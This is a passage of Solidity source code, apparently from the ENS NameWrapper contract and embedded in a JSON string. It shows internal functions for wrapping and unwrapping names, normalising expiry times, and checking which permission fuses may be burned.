expiry) = getData(uint256(node));\n\n        _burn(uint256(node));\n    }\n\n    function _updateName(\n        bytes32 parentNode,\n        bytes32 node,\n        string memory label,\n        address owner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        address oldOwner = ownerOf(uint256(node));\n        bytes memory name = _addLabel(label, names[parentNode]);\n        if (names[node].length == 0) {\n            names[node] = name;\n        }\n        _setFuses(node, oldOwner, fuses, expiry);\n        if (owner == address(0)) {\n            _unwrap(node, address(0));\n        } else {\n            _transfer(oldOwner, owner, uint256(node), 1, \"\");\n        }\n    }\n\n    // wrapper function for stack limit\n    function _checkParentFusesAndExpiry(\n        bytes32 parentNode,\n        bytes32 node,\n        uint32 fuses,\n        uint64 expiry\n    ) internal view returns (uint64) {\n        (, , uint64 oldExpiry) = getData(uint256(node));\n        (, uint32 parentFuses, uint64 maxExpiry) = getData(\n            uint256(parentNode)\n        );\n        _checkParentFuses(node, fuses, parentFuses);\n        return _normaliseExpiry(expiry, oldExpiry, maxExpiry);\n    }\n\n    function _checkParentFuses(\n        bytes32 node,\n        uint32 fuses,\n        uint32 parentFuses\n    ) internal pure {\n        bool isBurningParentControlledFuses = fuses & PARENT_CONTROLLED_FUSES !=\n            0;\n\n        bool parentHasNotBurnedCU = parentFuses & CANNOT_UNWRAP == 0;\n\n        if (isBurningParentControlledFuses && parentHasNotBurnedCU) {\n            revert OperationProhibited(node);\n        }\n    }\n\n    function _normaliseExpiry(\n        uint64 expiry,\n        uint64 oldExpiry,\n        uint64 maxExpiry\n    ) internal pure returns (uint64) {\n        // Expiry cannot be more than maximum allowed\n        // .eth names will check registrar, non .eth check parent\n        if (expiry > maxExpiry) {\n            expiry = maxExpiry;\n        }\n        // Expiry cannot be less than old expiry\n        if (expiry < oldExpiry) {\n            expiry = oldExpiry;\n        }\n\n        return expiry;\n    }\n\n    function _wrapETH2LD(\n        string memory label,\n        address wrappedOwner,\n        uint16 ownerControlledFuses,\n        address resolver\n    ) private {\n        bytes32 labelhash = keccak256(bytes(label));\n        bytes32 node = _makeNode(ETH_NODE, labelhash);\n        // hardcode dns-encoded eth string for gas savings\n        bytes memory name = _addLabel(label, \"\\x03eth\\x00\");\n        names[node] = name;\n\n        uint64 expiry = uint64(registrar.nameExpires(uint256(labelhash))) + GRACE_PERIOD;\n\n        _wrap(\n            node,\n            name,\n            wrappedOwner,\n            ownerControlledFuses | PARENT_CANNOT_CONTROL | IS_DOT_ETH,\n            expiry\n        );\n\n        if (resolver != address(0)) {\n            ens.setResolver(node, resolver);\n        }\n    }\n\n    function _unwrap(bytes32 node, address owner) private {\n        if (allFusesBurned(node, CANNOT_UNWRAP)) {\n            revert OperationProhibited(node);\n        }\n\n        // Burn token and fuse data\n        _burn(uint256(node));\n        ens.setOwner(node, owner);\n\n        emit NameUnwrapped(node, owner);\n    }\n\n    function _setFuses(\n        bytes32 node,\n        address owner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        _setData(node, owner, fuses, expiry);\n        emit FusesSet(node, fuses, expiry);\n    }\n\n    function _setData(\n        bytes32 node,\n        address owner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        _canFusesBeBurned(node, fuses);\n        super._setData(uint256(node), owner, fuses, expiry);\n    }\n\n    function _canFusesBeBurned(bytes32 node, uint32 fuses) internal pure {\n        // If a non-parent controlled fuse is being burned, check PCC and CU are burnt\n        if (\n            fuses & ~PARENT_CONTROLLED_FUSES != 0 &&\n            fuses & (PARENT_CANNOT_CONTROL | CANNOT_UNWRAP) !=\n            (PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)\n        ) {\n            revert OperationProhibited(node);\n        }\n    }\n\n    function _checkFusesAreSettable(bytes32 node, uint32 fuses) internal pure {\n        if (fuses | USER_SETTABLE_FUSES != USER_SETTABLE_FUSES) {\n            // Cannot directly burn other non-user settable fuses\n            revert OperationProhibited(node);\n        }\n    }\n\n    function _getEthLabelhash(bytes32 node, uint32 fuses)\n        internal\n        view\n        returns (bytes32 labelhash)\n    {\n        if (fuses & IS_DOT_ETH == IS_DOT_ETH) {\n            byt"
    }
  ]
}